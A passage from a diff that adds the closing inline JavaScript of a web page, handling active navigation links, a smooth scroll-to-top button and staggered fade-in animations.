+                link.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            window.scrollTo(0, 0);
+        }
+
+        function scrollToTop() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        window.addEventListener('scroll', () => {
+            const scrollBtn = document.querySelector('.scroll-top');
+            if (window.pageYOffset > 300) {
+                scrollBtn.classList.add('show');
+            } else {
+                scrollBtn.classList.remove('show');
+            }
+        });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            document.querySelectorAll('.fade-in').forEach((el, idx) => {
+                el.style.animationDelay = `${idx * 0.05}s`;
+            });
+        });
+    </script>
+</body>
+</html>
